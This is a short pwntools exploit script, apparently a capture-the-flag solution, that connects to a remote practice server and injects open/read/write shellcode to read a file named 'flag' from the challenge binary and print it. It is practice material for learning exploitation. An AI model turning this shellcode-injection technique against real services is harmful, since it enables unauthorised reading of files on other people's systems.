from pwn import *

context.arch = 'amd64'

#p = process('./asm')
p = remote('node4.buuoj.cn', 26616)

#gdb.attach(p, 'b *$rebase(0xea7)')

buf = 0x41414000 + 0x300

shellcode = shellcraft.open('flag')
shellcode += shellcraft.read('rax', buf, 0x40)
shellcode += shellcraft.write(1, buf, 0x40)

p.sendafter(b'shellcode: ', asm(shellcode, os='linux'))

print(p.recv())